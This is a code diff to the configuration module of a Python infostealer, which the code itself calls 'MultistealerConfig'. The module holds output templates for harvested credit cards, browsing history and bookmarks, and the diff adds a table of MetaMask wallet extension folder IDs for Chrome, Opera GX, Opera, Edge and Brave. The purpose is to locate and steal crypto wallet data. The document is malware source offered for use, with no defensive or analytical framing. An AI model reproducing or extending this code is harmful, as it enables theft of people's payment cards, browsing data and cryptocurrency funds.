@@ -1,3 +1,4 @@
+from enum import Enum
 from os import environ
 from getpass import getuser
 from re import compile, IGNORECASE, DOTALL
@@ -6,6 +7,15 @@ from re import compile, IGNORECASE, DOTALL
 user_profile = environ["USERPROFILE"]
 user = getuser()
 user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+
+
+class Browsers(Enum):
+    CHROME = "Chrome"
+    OPERA_GX = "Opera GX"
+    OPERA_DEFAULT = "Opera Default"
+    EDGE = "Microsoft Edge"
+    BRAVE = "Brave"
+    VIVALDI = "Vivaldi"
 
 
 class ChromiumConfig:
@@ -22,6 +32,39 @@ class ChromiumConfig:
     CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
     HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
     BookmarksData = "Title: {0}\nUrl: {1}\n\n"
+
+    WalletLogs = {
+        Browsers.CHROME.value: [
+            {
+                "name": "Metamask",
+                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            }
+        ],
+        Browsers.OPERA_GX.value: [
+            {
+                "name": "Metamask",
+                "folder": "djclckkglechooblngghdinmeemkbgci"
+            }
+        ],
+        Browsers.OPERA_DEFAULT.value: [
+            {
+                "name": "Metamask",
+                "folder": "djclckkglechooblngghdinmeemkbgci"
+            }
+        ],
+        Browsers.EDGE.value: [
+            {
+                "name": "Metamask",
+                "folder": "ejbalbakoplchlghecdalmeeeajnimhm"
+            }
+        ],
+        Browsers.BRAVE.value: [
+            {
+                "name": "Metamask",
+                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            }
+        ]
+    }
 
 
 class MultistealerConfig:
